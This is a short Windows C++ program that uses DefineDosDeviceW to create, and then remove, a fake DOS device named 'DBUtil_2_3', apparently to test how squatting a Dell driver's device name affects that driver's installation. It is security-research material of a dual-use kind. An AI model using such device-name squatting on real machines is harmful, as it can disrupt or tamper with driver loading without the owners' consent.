// CreateSym.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include <accctrl.h>
#include <aclapi.h>
#include <fstream>
#include <string>
#include <iostream>


int main()
{



	const wchar_t* wide_src_path= TEXT("DBUtil_2_3");
	const wchar_t* wide_dst_path = TEXT("DBUtil_2_3");

	BOOL dd= DefineDosDeviceW(DDD_RAW_TARGET_PATH, wide_src_path, wide_dst_path);
	//BOOL dd = DeleteFileA("DBUtil_2_3");
	if (!dd) {
		std::cout<<GetLastError()<<std::endl;
	}else	

	std::cout << "fake device craeted , try to install driver"<<std::endl;

	getchar();

	 dd = DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, wide_src_path, wide_dst_path);
	 if (!dd) {
		 std::cout << GetLastError() << std::endl;
	 }
	  else std::cout << "fake device deleted , try to install driver" << std::endl;

	getchar();
}
